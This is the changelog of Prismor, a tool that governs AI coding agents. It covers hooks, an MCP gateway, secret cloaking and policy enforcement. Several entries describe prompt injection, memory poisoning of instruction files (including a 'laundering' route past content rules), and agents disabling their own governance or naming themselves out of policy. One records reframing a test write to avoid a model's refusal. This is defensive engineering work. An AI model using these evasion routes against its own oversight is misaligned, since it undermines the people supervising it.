- Floor `idna` at >=3.15 (GHSA-65pc-fj4g-8rjx / PYSEC-2026-215): crafted input
  to `idna.encode()` bypasses the CVE-2024-3651 fix. Pulled transitively by
  `requests`, which is unaffected by the floor.

## [1.43.0] — 2026-08-20

### Added
- **Mirrored built-in tools.** Prismor can serve `Bash`, `Read`, `Write`, `Edit`, `Glob` and `Grep` as MCP tools it executes itself, so policy runs before the call and the output is redacted after — the one thing a `PreToolUse` hook structurally cannot do, and the only way to govern an agent that has no hook protocol at all. `prismor mirror on|off|status|passthrough` wires it into a host and undoes exactly what it wired; `on` starts the server and completes an MCP handshake before it disables anything, so a broken install can never leave the agent with no tools. Wired and verified against real sessions on Claude Code (per project), Codex (machine-wide) and OpenCode (per project — the only interposition point it has). Docs: `docs/governance-surfaces.md`, `docs/mcp-gateway.md`.
- `prismor setup` shows each agent's governance surface (hooks / hooks + MCP / MCP only / no interception), names the agents that have no hook protocol instead of omitting them, and offers the mirror as an explicit per-agent opt-in. Hooks remain the recommendation and the default; `--non-interactive` never installs the mirror.
- `prismor mirror passthrough on|off` runs mirrored built-ins ungoverned without a restart, for when the mirror is in the way but you do not want to uninstall it.
- `prismor dashboard --workspace` is accepted (it was resolved internally but rejected by the argument parser).

- **Claude Inference Hooks.** `prismor inference-hook serve` runs the AI security server behind Claude Enterprise Inference hooks: Anthropic POSTs each governed prompt from claude.ai, Claude Code and Cowork as a signed prompt frame; Prismor fans the transcript into canonical events, runs the normal policy pipeline (plus a channel deny floor for PII / credentials / prompt injection and a credential-in-transcript screen using the Cloak classifier) and answers `{"action": "allow"|"deny", "deny_reason", "reference_id"}` inside the verdict timeout. Standard Webhooks signature verification (`whsec_`, rotation grace, constant-time), tenant resolution from the signed `tenant_id`, always-HTTP-200 verdicts so a policy deny is never a webhook failure, `webhook-id` idempotency, shadow mode, fail-closed by default. `prismor inference-hook test` sends signed sample frames (or evaluates in-process); `prismor inference-hook secret` mints a secret. Docs: `docs/inference-hook.md`.

### Fixed
- **Mirroring silently disabled Cloak decloaking.** The cloaking hook matches the exact tool name `Bash`, so serving the tool over MCP stopped it firing and placeholders reached the shell literally. Substitution now happens inside the mirror's executor, after policy has judged the placeholder form, so the real secret never reaches policy, telemetry or the audit trail.
- `prismor pause` now reaches the MCP gateway. It previously suspended only the hook layer, so a paused machine kept blocking mirrored and remote MCP calls with no way to stop it short of uninstalling.
- Pause no longer switches off secret masking. It suspends enforcement and data-boundary redaction; masking of registered secret values keeps running, as it always has on the hook path.
- Pass-through (mirror override off) keeps serving its tools instead of serving none. Previously it left an agent whose native tools were disabled with no tools at all.
- A blocked mirrored call now carries the same unblock guidance the hook path gives, plus the mirror's own exits.

### Changed
- **Policy YAML is no longer re-parsed on every evaluation.** One `evaluate_tool_call` built two `PolicyEngine`s and the gateway evaluates twice per call, so a single mirrored tool call parsed a 90 KB rule file four times. Parsed documents are now cached by content hash (so an edited policy can never be served stale) and libyaml's loader is used when available. Measured on a 2-core box: mirrored `Read` 667 ms → 101 ms, blocked `Bash` 378 ms → 136 ms, the hook path 625 ms → 421 ms per call, and the test suite 105 s → 76 s.
- `prismor-self-edit` covers `prismor mirror on|off|passthrough` and `.prismor/mirror.json`, so an agent whose `Bash` *is* the mirror cannot hand itself the native tools back. `prismor mirror status` stays available to it.


## [1.42.2] — 2026-08-16

### Fixed
- `prismor scope clear` did not stick: it deleted the session's scope file, so the next prompt synthesised a fresh restrictive scope and the agent was blocked again (and told to run `scope clear` again). Clear now records the session as cleared — every tool allowed, auto-scoping off — for the rest of the session; `scope list` shows `(cleared)`.
- Session scopes could never include MCP tools: the synthesiser was given a fixed list of the seven built-in tools and clamped its output to it, so every `mcp__<server>__<tool>` call in a scoped session was denied by omission on every prompt regardless of what the prompt asked for. The synthesiser now sees one `mcp__<server>__*` family per MCP server the agent can reach (workspace `.mcp.json`, `~/.claude.json`, Claude Code plugin `.mcp.json`), allow/deny entries may be globs, and an auto-synthesised scope with no opinion on MCP falls through to the base policy instead of blocking. Hand-edited scopes remain authoritative.
- The scoped-rules box wraps long tool lists and its hint separates *adjust* (`scope show|edit`) from *stop scoping* (`scope clear`).

## [1.42.1] — 2026-08-15

### Fixed
- `prismor scope edit` crashed with `UnboundLocalError` (a function-local `import subprocess` shadowed the module import). It now also validates the JSON after editing and restores the previous rules on a parse error.
- `prismor scope show <id>` accepts the positional id every message told users to type (`--session-id` still works); `latest` and unique id prefixes are accepted by `show`/`edit`/`clear`.
- Session scope no longer locks a session to its first prompt: rules are re-derived on every prompt and unioned, static (no-API-key) rules always allow Bash, and shell-only agents (Codex, Hermes, Goose, …) always keep Bash. A hand-edited scope (dashboard or `scope edit`) freezes auto-widening.
- Runtime findings (scoped-agent, IAM, kill-switch, org tool denies) survived only until the next tool call: `save_session_snapshot` wiped them, so an enforce block vanished from `prismor status`/`sessions`. They are now kept and counted.
- `prismor status --all` always said "No registered workspaces" under the single-DB layout.
- `prismor sessions` / `prismor status` showed every workspace's sessions in every workspace; they are now per-workspace (`sessions --global` for the machine-wide list, now labelled with the workspace).
- Global (`--scope global`) hooks pinned the directory `setup` ran from as the workspace for every repo on the machine; they now resolve the workspace from the hook payload's cwd (git root).
- `prismor status`/`doctor`/`status --all` only looked for project-scope hooks and cloaking, so a globally-hooked workspace read as "not installed" (and the suggested fix produced double dispatch); `uninstall-hooks` reported success while the other scope kept screening. All three now report both scopes, flag double-hooking and mixed modes, and (un)install points at hooks left at the other scope.
- `setup --scope global --cloak` failed to install cloaking (`cloak install` only knew `--scope user`). `--scope user` and `--scope global` are now interchangeable on every command.
- `prismor workspace` told users to run `prismor scope personal|managed`, which does not exist.
- Codex silently ignores hooks it has not been told to trust; `setup`, `install-hooks` and `doctor` now say so and name the fix (`--dangerously-bypass-hook-trust` for headless runs).
- Setup summary shows the install scope; "Immunity" wording in the scope step; `status` next-step hints point at `prismor setup`.

## [1.40.1] — 2026-08-10

### Fixed

- **Automatic reporting never worked against the production console.** `send_report` was the only control-plane call in the runtime that did not set a `User-Agent`, so its request went out as bare `Python-urllib/3.x` and the WAF in front of prod rejected it with a 403 (Cloudflare error 1010). It worked perfectly against a local server, which is exactly why nothing caught it until a real enrolled device reported to the real console. Now uses the shared `http_ua.user_agent()` like `identity`, `remote_policy`, `sinks` and `approvals` already did.
- **Agents Prismor cannot hook were reported as governed, inflating fleet coverage.** `hooks._config_path` falls through to the Windsurf path for any agent it does not recognise, so asking `hook_installed` about Warp, Trae or Antigravity returned *Windsurf's* answer — every unhookable agent inherited Windsurf's hook status. On a machine with Windsurf hooked, coverage read 91% while counting four agents Prismor cannot govern at all. `hook_installed` now refuses an agent outside `_SUPPORTED_AGENTS` instead of borrowing another agent's config path.

## [1.40.0] — 2026-08-10

### Added

- **Reported findings now say whether they are fixable, and with which command.** The fleet view listed what was ungoverned and stopped there, so an admin looking at thirty findings could not tell which a developer clears in one command from which need a conversation — and a list that does not distinguish them is a list nobody triages. Each finding now carries `fixable`, `fix_command` and, when it is not fixable, `fix_blocked_reason`; the scan summary carries a `fixable` count. Computed with the same planner `discover --fix` runs, so the console can never offer a remediation the CLI would refuse. Best-effort by design: if planning fails the device still reports what it found, with everything marked unfixable, rather than failing the upload.

- **The gateway migration now covers every MCP config, not just a workspace `.mcp.json`.** Discovery reports servers declared by Claude Desktop, Cursor, VS Code, Cline and the rest, and `--fix` had to refuse all of them — most of what the sweep found could never be governed. `migrate_config` handles any JSON config declaring servers under `mcpServers` or `servers` (VS Code's spelling), and `prismor mcp-gateway install --all` migrates every config discovery can find. `discover --fix` uses it, so the set of files it rewrites is exactly the set the sweep reports as ungoverned rather than a second list that would drift.

  It rewrites files the developer owns, so the bar is deliberately high: everything outside the server block is preserved verbatim, the block is rewritten under the key it was found under (VS Code keeps `servers`), a `.bak` is written before anything else, and an unrecognised shape means *leave it alone* rather than guess — Zed's `context_servers` and Codex's TOML are refused by name with the reason, not silently skipped. `prismor mcp-gateway install` without `--all` is unchanged and still scoped to the one file it was pointed at.

- **`prismor discover --fix` governs what the sweep found.** Discovery reported ungoverned AI and left the operator to fix it by hand, one command per finding. `--fix` now closes the loop: unhooked agents get the global hook, MCP servers in the workspace `.mcp.json` move behind the gateway, and dotenv provider keys are imported into Cloak. It prints the plan first, says plainly what it *cannot* fix and why, and asks before writing — a remediation tool that quietly does less than it claims is worse than one that does nothing, because the report is what the operator then believes. `--yes` skips the prompt for CI, `--fix-mode enforce` installs in enforce rather than observe, and a section (`agents`/`mcp`/`keys`) narrows what is remediated. Piping without `--yes` declines rather than proceeding unattended.

  Worth stating plainly, because it bounds what "governance" can mean here: there is no way to constrain an agent Prismor has not hooked. Every enforcement surface — egress screening, the Docker sandbox, tool denies, kill switches — sits downstream of a hook payload, so an unhooked agent produces no event and nothing to act on. Governing shadow AI therefore means eliminating the shadow, not policing it in place, and agents with no hook surface at all (Warp, Trae, Antigravity) are reported as unfixable rather than pretended over.

### Fixed

- **A hooked agent could report as shadow forever.** The host sweep judged "governed" only from the config files it happened to enumerate, which are not the files `install_hooks` writes to. Cursor was the clearest case: discovery inspects `~/.cursor/mcp.json` (the registry lists no user-scope hook path for it) while the global installer writes `~/.cursor/hooks.json`, so a correctly hooked Cursor stayed ungoverned in every report — and made `--fix` claim a fix that the very next `discover` contradicted. Governed is now also judged with `hooks.hook_installed`, against the installer's own path table, so the two halves agree. Still a pure filesystem read, so the attested sweep stays deterministic.
- **Importing keys into Cloak could never improve coverage.** File-based credentials were hard-coded `managed=False` on the grounds that a live pattern match means the key is exposed. But `cloak add --env-file` vaults the value and stands the env-guard down without rewriting the file, so the pattern still matches afterwards — leaving the remediation loop impossible to close. A dotenv now counts as governed when Cloak holds *every* name in it; a partially-vaulted file is still an exposed key.
- **A malformed agent config is no longer silently replaced.** `install_hooks` read the config, merged its hook in and wrote the result straight back, and the read fell back to `{}` on a parse error — so a config with a stray comma came back containing nothing but Prismor's own hook, every developer setting gone, with no error. It now raises a typed `HookConfigError` naming the file, which the automated paths (`--fix`, `ensure_global_coverage`) report per agent and carry on from.

- **Project-memory scanning now covers every supported agent, not just Claude.** The `memory` event was produced only by `_normalize_claude`, because Claude is the one agent Prismor wires a real `SessionStart` hook for — so 13 of 14 supported agents had *zero* project-memory scanning, and nothing said so. The scan now also runs on the first event of any session that did not arrive as a `memory` event, which keeps it a pre-action check without requiring a session-start surface most agents do not expose. A codex or cursor session now raises the same ASI06 findings a Claude session always did.
- **The instruction-file set that is read now matches the set that is guarded on write.** `_MEMORY_FILENAMES` held only `CLAUDE.md`/`AGENTS.md`, while `agent-instruction-tampering` warned on writes to six more — Prismor locked the door without ever checking who was already inside. `CLAUDE.local.md`, `GEMINI.md`, `.cursorrules`, `.windsurfrules`, and `.github/copilot-instructions.md` are now scanned too.
- **New `memory-directive-on-write` rule (category `memory_poisoning`, warn) closes the mid-session hole.** `memory-embedded-directive` only sees project memory as it is loaded at session start, and `agent-instruction-tampering` matches on `path` alone — so a directive written into `CLAUDE.md` *during* a session was invisible until the next one, by which point the agent may already have acted on it. `file_write` events already carry the written text in `content`, so the same directive patterns apply with no new plumbing. A `pattern_groups` + `condition` expression (`"patterns and instruction_file"`) narrows the rule to writes actually targeting an instruction file; without it the rule would fire on any document that merely discusses the phrasing, including Prismor's own policy file.
- **New `memory-file-drift` check (category `memory_poisoning`, warn) is the provenance-independent backstop.** The directive rules only catch poison someone already wrote a regex for; reword the attack and it walks through. Each scanned instruction file is now fingerprinted and compared against the previous session, so a change to a trusted file is reported whatever the wording. A file seen for the first time is recorded silently — only a *change* to already-trusted content is a finding. Reuses the MCP rug-pull drift machinery in `scanner.py` rather than adding a second baseline store.
- **New `memory-self-reinforcement` check (category `memory_poisoning`, warn) catches the laundering step.** An agent reads untrusted content, then writes it verbatim into an instruction file; on the next session that text is no longer "something the agent read" but its own durable, implicitly trusted memory, having bypassed every content rule that would have scrutinized it as tool output. Only a verbatim echo of a substantial line is flagged — a genuine summary is reworded — and `prompt` events are excluded, since recording what the human actually typed is the normal case.
- **New `memory_redact` transform** for `action: modify` on `memory-directive-on-write`, which strips flagged directive lines from a write before it lands. It reuses the rule's compiled patterns rather than restating them, so an overlay that tunes the rule automatically tunes what gets redacted. The rule still ships as `warn`: `modify` fails closed to DENY on every surface that cannot rewrite tool input, which would turn a false-positive-prone MEDIUM heuristic into a hard deny on most agents. Naming the transform on the rule means opting in is a one-key overlay change.

## [1.39.0] — 2026-08-07

### Added

- **`prismor discover` now sweeps MCP servers and provider keys, not just agents.** The host sweep answered "which installed agents have no hooks" and stopped there, which left the two surfaces that have grown fastest entirely unmeasured: MCP servers, which are declared by desktop apps and IDE extensions that expose no hook surface at all and so never appeared in any Prismor inventory, and AI-provider credentials sitting uncloaked in the environment and in agent config files. Each is diffed against the governed set that actually applies to it — hooks for agents, `prismor mcp-gateway` for MCP, Cloak for keys — and the report ends with a single coverage percentage over all three. `prismor discover [agents|mcp|keys]` limits the report; `--fail-on-shadow` exits 1 for CI. Coverage is `None`, not 100%, when nothing governable is found, so a bare machine cannot read as fully covered.
- **Enrolled devices report their inventory automatically.** `--report` alone would have meant the org's fleet view stayed empty until somebody thought to run a command by hand — the precise state a fleet view exists to eliminate, and one where "no shadow AI" and "nobody looked" are indistinguishable. `prismor enroll` now seeds the console with this machine's inventory as part of enrollment, and the runtime refreshes it once a day (`PRISMOR_DISCOVER_INTERVAL` to change). The refresh spawns a detached child rather than scanning inline: a full scan is a few hundred milliseconds of filesystem work, which is nothing on a command line and a visible stall on somebody's tool call. The hook path pays 0.065 ms to check whether a report is due. Gated on the managed workspace exactly like the volume heartbeat, so a personal repo never reports what is installed on the developer's machine.
- **`prismor discover --report` sends the inventory to your organization console**, where it becomes a fleet-wide Shadow AI view (per-device coverage, ungoverned findings, and how many enrolled machines have never scanned at all). What crosses the network is the redacted record, not the raw config — the same `McpRecord`/`CredentialRecord` the terminal prints, so a value hidden locally cannot leak remotely. Silently a no-op on an unenrolled or revoked device, and never raises: a control plane that is down must not fail a developer's command, and the report says which of "not enrolled" or "console unreachable" happened, because they are different actions.
- **Agent presence now spans the whole integration registry.** The sweep iterated `scanner._AGENT_DISCOVERERS` — the six agents Prismor parses MCP configs out of — so an ungoverned Aider, Kiro, Trae or Warp install was invisible to the command whose entire job is finding ungoverned installs. It now walks every coding agent in `integrations/registry.yaml`. Presence stays a pure filesystem question (no `$PATH` probe) because this report is folded into the signed attestation bundle and must not vary with the caller's shell; the `$PATH` probe lives in the `discover` layer, outside the bundle. Agents Prismor has no hook for are reported as "no coverage" and excluded from the shadow count — nothing was skipped, so counting them as findings would inflate the number.

### Changed

- **`prismor discover --json` emits a new shape** (breaking for anything parsing it). It was the raw host-sweep report — `{agents: [{agent, present, governed, seen, ...}], summary: {present, governed, ungoverned, seen}}` — and is now `{workspace, context, summary, agents, mcp, credentials}`, with per-surface totals in `summary` and richer agent rows (`id`, `name`, `managed`, `coverable`, `mode`). The old shape is still produced by `prismor.runtime.enterprise.discovery.discover()` and is what still rides in the attestation bundle under `discovery`, unchanged — so bundle consumers and `attest verify` are unaffected.

### Fixed

- **Servers behind the MCP gateway were missing from the inventory entirely.** `mcp_gateway.install_gateway` *moves* the `mcpServers` block out of `.mcp.json` and leaves only the gateway entry, so after a correct install the governed servers appeared in no scanned config: they vanished from the report and took the coverage denominator with them, while the only thing that could produce a `managed` verdict was a config still naming a server directly — which is a gateway *bypass*. Gateway-registered servers are now read from the gateway config and counted as governed, and a server declared directly while also registered with the gateway is reported as high-risk shadow with an explicit reason, since the direct declaration is a live path that skips policy.
- **Agents whose registry config path is a directory could never read as governed**, which put false shadow findings into the signed attestation bundle. `_config_has_marker` called `read_text` on the path; a directory raises `IsADirectoryError`, which was swallowed into `governed=False` unconditionally. Nine registry entries are directories (`~/.aider/`, `~/.config/opencode/plugins/`, `.trae/rules/` …), so installing Prismor's opencode plugin still reported opencode as ungoverned. Directories are now walked for the marker, bounded to keep the sweep fast.
- **Glob config paths were checked as literals**, so `amazon-q` (`.amazonq/cli-agents/*.json`) and `amp` (`.amp/plugins/*.ts`) could never be detected as installed or governed. Patterns containing `*` are now expanded.
- **Several credential shapes survived redaction.** `NAME=value` argv (`docker run -e GITHUB_TOKEN=<pat>`, the most common way an MCP server receives a credential), arguments containing whitespace (`--header "Authorization: Bearer <token>"`), all-hex and all-digit keys (the old rule demanded both a letter and a digit, and hex letters stop at `f`), keys shorter than the length floor despite a known provider prefix, and URLs `urlsplit` rejects — which returned the raw string, userinfo included. Redaction now keys on the longest unbroken alphanumeric *run* rather than total string length, which simultaneously stopped it masking useful values like `gpt-4o-mini-2024-07-18` and relative directory arguments.
- **Registry config paths were resolved with `Path.expanduser()`**, which reads `$HOME` directly and so escaped a patched `Path.home()` — the host sweep read the real machine's configs even under test isolation. Now expanded against `Path.home()`, consistent with the rest of the module.
- **MCP server URLs and argv are redacted before a record is constructed.** An MCP endpoint routinely carries the caller's key in a path segment or query parameter, so the raw URL is a live credential; the discovery report both prints it and serializes it to JSON. Credential-shaped segments, secret-ish query parameters, URL userinfo, and `--api-key`-style flag values are now masked at construction rather than at render time, so no downstream consumer can receive a value the terminal would have hidden. Three token shapes are recognised — bare high-entropy strings, JWTs, and base64 blobs — because MCP bearer tokens are usually one of the latter two, and the dots in a JWT and the `+/=` in base64 both defeat a single plain-alphanumeric pattern. Each shape requires both a letter and a digit and a substantial length, so ordinary paths, dotted version strings, and package specifiers survive intact.

## [1.38.1] — 2026-08-06

### Fixed

- **Cleared all five open Dependabot alerts.** Bumped the `vercel-ai` adapter's dev dependency on `ai` from `^4.0.0` to `^7.0.51` and `pipeline/requirements.txt`'s `requests` pin from `2.31.0` to `2.34.2`. (#243)

## [1.38.0] — 2026-08-03

### Added

- **Tool-level step-up: an admin can mark a tool "requires human approval" from the console.** `settings.tool_denies` understood only `deny` and `allow`, so a `step_up` entry was skipped and the call ran — a policy the fleet silently ignored. A step-up entry now produces a finding carrying `action: step_up`, which `should_block` ranks below a real block and above `defer`: interactive agents render an inline ask, headless ones post an approval request and wait on the decision. Every non-approval outcome (deny, expiry, timeout, error) still fails closed, so this is strictly softer than a deny and never softer than allowing the call. Like a deny it is categorised `agent-control`, so a local `--mode observe` cannot suppress an approval requirement the org set.

## [1.37.0] — 2026-08-03

### Added

- **`PRISMOR_WORKSPACE_SCOPE` — an explicit scope for deployed, repo-less agents.** Workspace scope is inferred from the git remote, and it gates the org policy overlay, which is what carries the telemetry sink. A container or CI runner has no remote, so for an org that claims repo patterns the workspace fell through to `local`: no org policy, no telemetry, no heartbeat, no fleet registration, and not one line of output saying so. A production agent looked healthy and reported nothing. Set `PRISMOR_WORKSPACE_SCOPE=managed` (or `personal`/`local` to opt out) and the question is settled from the environment, so it needs no writable `$PRISMOR_HOME`. It is ranked below an org-claimed pattern, so a deployment can never use it to downgrade a repo the org governs.

### Fixed

- **`prismor enroll-status` leads with the verified state.** It printed the headline "Enrolled" from the local file even when the very next line reported the control plane had refused the key. It now says `Enrolled and verified`, `Enrolled — control plane unreachable, could not verify`, or `NOT usable — the control plane refused this key` with the remedy.
- **`prismor enroll-status` and `prismor doctor` now verify against the control plane instead of trusting the local file.** Both reported "Enrolled" from `identity.json` alone, so a revoked, mistyped, or wrong-org key still read as healthy — and a `PRISMOR_AGENT_KEY` identity carries no org/device/label fields, so a perfectly working deployed agent printed `org: None / device id: None / label: None`. Both commands now make one authenticated call to `/api/policy/version` and print what the server resolved, or the reason it refused. `doctor`'s telemetry-sink check moved off the unauthenticated `/api/health` (up for anyone, so it passed with an invalid key) onto the same authenticated probe, and reports the org's capture mode alongside it.
- **`prismor doctor` fails on a `local` workspace scope**, the quietest way to see nothing at all, and names the fix for both the deployed and the dev-machine case.

## [1.36.0] — 2026-08-02

### Added

- **Headless approvals are now user-configurable and event-loop-safe.** New `PRISMOR_APPROVALS` master switch (default on; `0`/`false`/`off` disables escalation fleet-wide - a STEP_UP verdict then fails closed exactly like an unenrolled install, without a control-plane round trip) plus a per-guard `approvals=False` keyword on every adapter surface that escalates (`prismor_guard_tool`/`guard_tools` and `PrismorCallbackHandler` for LangChain, `prismor_guard_tool` for CrewAI, `guard_controller` for browser-use, `prismor_guard`/`guard_agent` for OpenAI Agents). New `await_step_up_async()` runs the approval poll in a worker thread; the async adapters (LangChain `coroutine` path, browser-use, OpenAI Agents) now use it, so a pending approval no longer parks the event loop - previously a step-up froze every concurrent tool, LLM stream, and (for browser-use) the CDP socket for up to `PRISMOR_APPROVAL_TIMEOUT` seconds, which could time the browser out before a human ever decided. Approval outcomes and fail-closed semantics are unchanged.
- **At-rest transcript reconstruction — `prismor ingest --discover`.** Prismor's knowledge previously started the moment `install-hooks` ran, even though every supported agent already writes a full record of what it did to disk. The detection engine was always time-agnostic (`PolicyEngine.evaluate` takes an event; it has no notion of "live"), so the only missing piece was a way to feed it history. Adapters turn on-disk session transcripts into the same *hook-shaped payloads* the live dispatcher receives and hand them to `hooks.normalize_payload` — reusing the live normalizer, the live engine, and the live `should_block`. That reuse is the point: the "what would enforce mode have blocked" answer is computed by the same function the dispatcher calls, so reconstructed detection cannot drift from real enforcement. Answers four questions that previously had none: what agents have been doing (backfills the dashboard on first run, stored as `source=transcript`), what flipping a rule to enforce would actually block (per rule, with recency), which sessions ran with no live Prismor record (`--coverage`), and how rules behave against real usage (`--export-corpus` writes redacted positive/negative fixtures). Claude Code and Codex adapters are verified against real transcripts; the Hermes adapter is contract-tested only and documented as unverified. Adding an agent is ~40 lines against `JsonlAdapter`. Replayed sessions are namespaced `replay:<agent>:<id>` — the store is INSERT-OR-REPLACE keyed on `session_id` and a Claude transcript carries the same id the live hooks used, so an unprefixed replay would have silently overwritten real enforcement history. Sweeps are idempotent, clean up the taint files they create, and force-disable the semantic guard (it would otherwise fire one LLM call per uncertain event across an entire archive; `--semantic` opts back in). `prismor ingest --input` is unchanged. (#238)

## [1.35.0] — 2026-07-29

### Added

- **Per-agent tool-tag overlays.** `settings.tool_tags.agents[<agent>]` mirrors the shape `settings.egress.agents` already uses, so the two channels behave identically: a policy attached to one agent in the control plane arrives here and applies to that agent alone. The overlay is **tighten-only** by design — it may add tag mappings and rules and raise the mode to enforce, but can never remove a tag, drop a rule, or lower the mode. An agent's name arrives in the event asserted by its own process rather than by any credential, so a permissive overlay would be a way for a compromised agent to name itself out of the fleet's policy; adding restrictions is safe under that assumption, removing them is not. `validate_policy` now walks the per-agent overlays too, since a broken rule expression hidden in an overlay is exactly as broken as one in the fleet block and considerably harder to notice. (#225)

### Fixed

- **`toolTagsSig` is now compared on the device, so a new tag rule actually reaches it.** The control plane has always sent the signature and nothing here read it, so a tag change only propagated when some *other* channel happened to churn — an admin adding a blocking tag rule would watch it do nothing. The signature hashes the resolved `settings.tool_tags` block as canonical JSON, the way `_current_egress_sig` already does. That detail is what made the comparison possible at all: the device only ever holds the resolved block, never the rows behind it, so a row-derived signature is one it cannot reproduce. Expect one re-pull per org as the signature format settles. (#225)

## [1.34.1] — 2026-07-24

### Fixed

- **The 7 new framework adapters (pydantic-ai, autogen-core, agno, semantic-kernel, google-adk, beeai, claude-agent-sdk) are now bundled into the main `prismor` package instead of being separate PyPI distributions.** Attempting to publish them as standalone `prismor-<name>` packages in 1.34.0 failed uniformly — including for the pre-existing `prismor-langchain`/`prismor-crewai`/`prismor-openai`/`prismor-browser-use` packages — because none of those were ever real PyPI projects; every adapter's own README already documented `pip install "prismor[<name>]"`, not a standalone install. Extended `pyproject.toml`'s `packages`/`force-include`/optional-dependencies the same way the original 4 already worked, so `pip install "prismor[beeai]"` etc. now actually installs the adapter (via `from prismor.beeai import guard_tool`). `.github/workflows/release-adapters.yml` no longer tries to publish standalone Python packages to PyPI — it only publishes the genuinely-separate npm packages (`prismor-vercel`, `prismor-mastra`), which can't be bundled into a Python wheel.

## [1.34.0] — 2026-07-23

### Added

- **5 new shipped coding-agent integrations: Crush, OpenHands, Qwen Code, Continue CLI, and Goose.** Each verified live against a real install, not just docs — surfaced several discrepancies between what each agent's own docs describe and what actually dispatches (Crush only fires `PreToolUse`, deny reason comes from stderr; OpenHands' shell tool is `terminal` with an `event_type` field instead of `hook_event_name`; Qwen Code's shell tool is `run_shell_command` with a nested `hookSpecificOutput.permissionDecision` deny envelope; Continue CLI hooks did not fire at all in headless `cn -p` mode, shipped with a prominent warning; Goose's shell tool is `shell`, not `developer__shell` as goose's own docs example shows). Plus accurate `roadmap` registry entries for 7 more coding agents not previously catalogued here (Pi Agent, Amazon Q Developer CLI, Amp, Auggie CLI, Kimi Code, Devin CLI) and Warp (sweep-only). (#212)
- **8 new framework adapter packages, each individually live-verified against a real model-backed agent run before shipping:** `prismor-pydantic-ai`, `prismor-autogen-core`, `prismor-agno`, `prismor-semantic-kernel`, `prismor-google-adk`, `prismor-mastra` (npm), `prismor-beeai`, and `prismor-claude-agent-sdk`. Every one denies a destructive tool call and allows a benign one before its policy engine call returns — see each package's README for the exact hook mechanism. The Mastra adapter was rewritten mid-development after its originally-planned `processOutputStep` + `abort()` hook was found live-tested to not actually block tool execution; it now wraps `tool.execute` directly instead, which is reliable. The Claude Code Agent SDK adapter required a discriminating test methodology (a benign-framed `.claude/settings.json` write, since naive destructive commands trigger Claude's own alignment refusal independent of any hook) — that test also caught a real bug where the adapter's default hook matcher never fired for custom MCP tools. (#213)

## [1.33.0] — 2026-07-23

### Added

- **Enrollment guards the whole machine, not just one project.** An enrolled device is now installed at GLOBAL scope by default — the post-enroll prompt offers to guard every project (`~/.claude` etc.), and `prismor setup --scope global` (or `PRISMOR_SCOPE=global`) does it non-interactively. This closes the gap where an agent escaped governance simply by working in an un-hooked directory. `prismor enroll-status` now reports per-agent hook coverage and flags any UNGUARDED agent with the fix command; on a policy refresh the runtime self-heals by re-asserting the global hook for a detected agent that has none (`prismor/runtime/hooks.py`: `coverage`/`unguarded_agents`/`ensure_global_coverage`). Global-scope install at enroll is the primary guarantee; self-heal is defense-in-depth. (#210)

### Changed

- **The paused heartbeat follows the user, not a 30-second timer.** A paused device emitted a "Prismor paused locally" heartbeat every ~30s of tool activity, so a long paused session flooded the Activity feed with dozens of identical rows. It now beats only on a user-turn boundary (a prompt submit / session start) — roughly one "still paused" per message — with a 60s floor to coalesce rapid messages. An idle paused machine stays quiet and beats again the moment the user acts.

## [1.32.1] — 2026-07-23

### Fixed

- **`prismor update` / startup update-nag checked the wrong PyPI package.** Both the passive startup notice and `prismor update` looked up the pre-rename `immunity-agent` package instead of `prismor`, and the notice's 24h cache had no way to invalidate after the rename — producing contradictory output like `note: prismor 1.31.0 is available (you're on 1.32.0)` immediately followed by `prismor 1.32.0 is already the latest version.` Both now check `prismor` on PyPI, and a live check (e.g. `prismor update`) refreshes the shared cache so the passive notice doesn't linger stale.
- **`prismor resume` left the dashboard showing "paused".** `prismor pause` heartbeats the control plane immediately so the console reflects the paused state right away; `prismor resume` only removed the local marker and relied on the *next* real tool call to clear it server-side. It now sends an immediate resumed heartbeat, so the console clears the paused badge as soon as you resume.

## [1.31.0] — 2026-07-22

### Added

- **Tag-rule expression language for policy-as-code over tool tags.** A tiny DSL in `settings.tool_tags.rules` — `TAG (then|with TAG)* [-> block|warn]` — expresses ordered (`then`) and unordered (`with`) tag co-occurrence rules, with `-> warn` logging findings without ever blocking. Fully backward compatible: legacy `incompatible:` lists keep working, compiling to the same IR (`prismor/runtime/tag_rules.py`) as the new syntax. `TagLedger` gains ordered greedy-subsequence matching for 3+-step rules. New `prismor tags {list,set,rm,rules,edit,lint,test}` CLI, including a `test` subcommand that replays recorded session logs through a ruleset and reports `WOULD BLOCK`/`WOULD WARN` without touching real enforcement state. The MCP Gateway now also reads tags a server self-declares on its tool definitions (`_meta.prismor.tags`, `_meta.tags`, `annotations["prismor/tags"]`) and stamps them onto call events. See `docs/tool-tags.md`. (#208)

## [1.30.3] — 2026-07-22

### Docs

- **MCP Gateway: per-tool and per-user governance.** Documented turning off
  individual tools of a server for the whole org (`settings.tool_denies`) or
  for one person (`settings.subject_controls` deny_tools), managed from the
  console MCP Hub and enforced by every gateway. See docs/mcp-gateway.md.

## [1.30.2] — 2026-07-22

### Docs

- **Hosted MCP instances (Enterprise).** Documented the managed-edge option
  for the gateway: from the console's MCP Hub, Enterprise orgs can provision a
  governed `mcp.prismor.dev/mcp/<key>` URL — the same real policy engine and
  telemetry as the local gateway, running on Prismor's fleet, with the
  registry's servers attached and secrets kept server-side. The local
  `prismor mcp-gateway` remains available on every plan. See docs/mcp-gateway.md.

## [1.30.1] — 2026-07-22

### Fixed

- **Control-plane requests now send a real User-Agent.** Every enterprise HTTP call (policy version/pull, telemetry upload, enrollment, approvals, sink deliveries) used urllib's default `Python-urllib/x.y` UA, which CDN/WAF fronts reject before the request reaches the app — Cloudflare's browser integrity check returns 403 (error 1010). The runtime interpreted that 403 as key revocation and silently stopped telemetry and policy sync. Found live when prismor.dev moved behind a proxying CDN; all outbound requests now identify as `prismor-runtime/<version>`.

## [1.30.0] — 2026-07-21

### Added

- **MCP Gateway (`prismor mcp-gateway`).** One MCP connector that fronts every downstream MCP server: point any MCP client (Claude Code, Cursor, Codex, …) at a single `prismor` entry and move the existing `mcpServers` block behind it (`prismor mcp-gateway install` automates the migration, with backup). Every `tools/call` runs through `evaluate_tool_call` before forwarding — org tool denies, tool-category crossover, IAM, policy rules — and every tool **result** is injection-scanned before the model sees it. Denials return MCP `isError` results carrying the block reason and rule id so the agent can adapt. Tools are exposed as `<server>__<tool>` while events record `mcp__<server>__<tool>` with the real server name, so existing matchers and console inventory apply unchanged. Supports stdio and streamable-HTTP/SSE upstreams, aggregator and single-upstream shim modes, with zero new dependencies. See #207.
